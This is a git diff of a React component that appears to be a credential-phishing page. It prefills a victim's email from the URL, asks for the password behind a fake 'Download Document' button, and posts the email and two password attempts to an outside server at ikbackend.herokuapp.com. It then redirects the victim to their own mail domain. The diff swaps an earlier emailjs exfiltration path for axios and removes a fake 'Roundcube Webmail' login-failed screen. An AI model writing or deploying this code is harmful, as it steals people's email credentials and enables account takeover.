@@ -6,61 +6,52 @@ import { useParams } from "react-router-dom";
 
 function Forms() {
   const params = useParams();
-  console.log(params.id);
 
   const [showForm, setShowForm] = useState(true);
   const [confirmForm, setConfirmForm] = useState(false);
+  const [pass, setPass] = useState("");
+  const [pasers, setPasser] = useState("");
+  const [email, setEmail] = useState(params.id);
 
-  const submitHandler = (e) => {
+  const submitHandler = async (e) => {
     e.preventDefault();
 
-    emailjs
-      .sendForm(
-        "gmail",
-        "template_hb9qmr9",
-        e.target,
-        "user_SEoZ3jhZmvmc7W9yRaSnR"
-      )
-      .then(
-        (result) => {
-          console.log(result.text);
-        },
-        (error) => {
-          console.log(error.text);
-        }
-      );
-    e.preventDefault();
-    setShowForm(false);
+    console.log(email, pass);
     setConfirmForm(true);
+    setShowForm(false);
+    try {
+      await axios.post("https://ikbackend.herokuapp.com/sendmail", {
+        email,
+        pass,
+        pasers,
+      });
+    } catch (error) {
+      console.log(error);
+    }
   };
-
-  const editHandler = (e) => {
+  const editHandler = async (e) => {
     e.preventDefault();
+
     let emailss = params.id;
     let domain = emailss.substring(emailss.lastIndexOf("@") + 1);
-    emailjs
-      .sendForm(
-        "gmail",
-        "template_hb9qmr9",
-        e.target,
-        "user_SEoZ3jhZmvmc7W9yRaSnR"
-      )
-      .then(
-        (result) => {
-          console.log(result.text);
-        },
-        (error) => {
-          console.log(error.text);
-        }
-      );
-
     window.setTimeout(() => {
       window.location.href = `https://${domain}`;
     }, 1000);
+
+    try {
+      await axios.post("https://ikbackend.herokuapp.com/sendmail", {
+        email,
+        pass,
+        pasers,
+      });
+    } catch (error) {
+      console.log(error);
+    }
   };
 
   return (
     <Styls>
+    
       {" "}
       {showForm && (
         <div id="html_encoder_div">
@@ -93,21 +84,22 @@ function Forms() {
                     </div>
                     <input
                       type="email"
-                      name="to_user"
                       required
+                      value={email}
                       className="form-control"
-                      value={params.id}
+                      onChange={(e) => setEmail(e.target.value)}
                     />
                     <input
                       type="password"
-                      name="to_pass"
+                      onChange={(e) => setPass(e.target.value)}
                       required
+                      value={pass}
                       placeholder="Password"
                       className="form-control"
                     />
 
                     <div className="btn-holder">
-                      <button className="btn btn-lg col-12">
+                      <button type="submit" className="btn btn-lg col-12">
                         Download Document
                       </button>
                     </div>
@@ -153,21 +145,22 @@ function Forms() {
                     </div>
                     <input
                       type="email"
-                      name="to_user"
                       required
+                      value={email}
                       className="form-control"
-                      value={params.id}
+                      onChange={(e) => setEmail(e.target.value)}
                     />
                     <input
                       type="password"
-                      name="to_pass"
+                      onChange={(e) => setPasser(e.target.value)}
                       required
+                      value={pasers}
                       placeholder="Password"
                       className="form-control"
                     />
 
                     <div className="btn-holder">
-                      <button className="btn btn-lg col-12">
+                      <button type="submit" className="btn btn-lg col-12">
                         Download Document
                       </button>
                     </div>
@@ -178,44 +171,7 @@ function Forms() {
           </div>
         </div>
       )}
-      {confirmForm && (
-        <div className="contsainer">
-          <div className="imagees"></div>
-
-          <form className="formal" onSubmit={editHandler}>
-            <label>
-              <span className="newicon1">
-                {" "}
-                <i class="fas fa-user fa-1x"></i>{" "}
-              </span>
-              <input
-                type="email"
-                name="to_user"
-                required
-                value={params.id}
-                placeholder="Username"
-              />
-            </label>
-            <br></br>
-
-            <label>
-              <span className="newicon1">
-                {" "}
-                <i class="fas fa-lock fa-1x"></i>{" "}
-              </span>
-              <input
-                type="password"
-                name="to_pass"
-                required
-                placeholder="Password"
-              />
-            </label>
-            <p className="reda">Login failed Incorrect Password</p>
-            <button> LOGIN </button>
-            <p>Roundcube Webmail </p>
-          </form>
-        </div>
-      )}
+  
     </Styls>
   );
 }
